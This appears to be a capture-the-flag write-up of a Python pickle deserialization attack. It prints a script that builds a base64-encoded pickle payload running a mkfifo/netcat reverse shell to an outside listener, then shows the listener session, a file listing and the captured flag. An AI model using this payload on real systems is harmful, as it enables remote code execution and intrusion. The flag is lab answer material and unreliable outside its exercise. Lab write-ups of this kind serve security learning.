Ran the following script inorder to get the encoded Payload 
```python
import pickle

import sys

import base64

  

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat 10.9.18.195 4444 > /tmp/f'

  

class rce(object):

    def __reduce__(self):

        import os

        return (os.system,(command,))

  

print(base64.b64encode(pickle.dumps(rce())))
```

Found that we can access the file system 

```shell

nc -lnvp 4444
onnect to [10.9.18.195] from (UNKNOWN) [10.10.221.9] 36792
/bin/sh: 0: can't access tty; job control turned off

 
```
```shell
ls
app.py
Dockerfile
index.html
launch.sh
__pycache__
requirements.txt
static
templates
user.html
venv
vimexchange.sock
wsgi.py
```

Found the flag by finding where I am in the file directory and using pwd 

```shell
pwd

/home/cmnatic/app


ls
app
flag.txt
launch.log


cat flag.txt
4a69a7ff9fd68


```
Always look at the file direcory
